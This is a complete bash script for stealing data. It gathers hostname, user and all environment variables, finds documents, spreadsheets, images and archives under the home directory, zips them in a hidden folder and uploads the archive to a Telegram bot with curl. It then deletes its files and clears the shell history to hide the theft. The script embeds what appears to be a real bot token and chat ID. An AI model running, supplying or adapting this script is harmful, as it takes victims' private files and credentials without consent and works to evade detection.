#!/bin/bash

# Customizable Parameters
TELEGRAM_BOT_TOKEN="7773792784:AAFfeZfSjo3yVYIbUPA1xwlMK17l-Fak2sg"  # Replace with your bot token
TELEGRAM_CHAT_ID="1318817377"               # Replace with your chat ID
ROOT_DIRECTORY="$HOME"                        # Root directory to start searching from
HIDDEN_DIRECTORY="$HOME/.hidden_folder"       # Hidden directory path
ZIP_FILE="$HOME/collected_data.zip"           # Temporary ZIP file path

# File types to collect (e.g., documents, images, etc.)
FILE_TYPES=("*.txt" "*.doc" "*.docx" "*.pdf" "*.xls" "*.xlsx" "*.jpg" "*.png" "*.zip" "*.rar")

# Function to send a message to Telegram
send_to_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}"
}

# Function to send a file to Telegram
send_file_to_telegram() {
    local file_path="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
        -F "chat_id=${TELEGRAM_CHAT_ID}" \
        -F "document=@${file_path}"
}

# Function to collect system information
collect_system_info() {
    echo "=== System Information ==="
    echo "Hostname: $(hostname)"
    echo "Username: $(whoami)"
    echo "Operating System: $(uname -a)"
    echo "Current Directory: $(pwd)"
    echo "Environment Variables:"
    env
}

# Function to collect files of specific types
collect_files() {
    local directory="$1"
    for file_type in "${FILE_TYPES[@]}"; do
        find "$directory" -type f -iname "$file_type"
    done
}

# Function to create a ZIP file
create_zip_file() {
    local source_folder="$1"
    local zip_file="$2"
    zip -r "$zip_file" "$source_folder" > /dev/null
}

# Function to delete footprints
delete_footprints() {
    # Delete the hidden directory and its contents
    rm -rf "$HIDDEN_DIRECTORY"
    # Delete the temporary ZIP file
    rm -f "$ZIP_FILE"
    # Clear Bash command history
    history -c
}

# Main function
main() {
    # Create a hidden directory
    mkdir -p "$HIDDEN_DIRECTORY"

    # Collect system information
    system_info=$(collect_system_info)
    echo "$system_info" > "$HIDDEN_DIRECTORY/system_info.txt"

    # Collect files of specific types
    echo "Collecting files from $ROOT_DIRECTORY..."
    files=$(collect_files "$ROOT_DIRECTORY")
    for file in $files; do
        echo "Copying $file to $HIDDEN_DIRECTORY"
        cp --parents "$file" "$HIDDEN_DIRECTORY"
    done

    # Create a ZIP file
    echo "Creating ZIP file..."
    create_zip_file "$HIDDEN_DIRECTORY" "$ZIP_FILE"

    # Send the ZIP file to Telegram
    echo "Sending ZIP file to Telegram..."
    send_file_to_telegram "$ZIP_FILE"

    # Delete footprints
    echo "Cleaning up..."
    delete_footprints

    echo "Done!"
}

# Run the main function
main
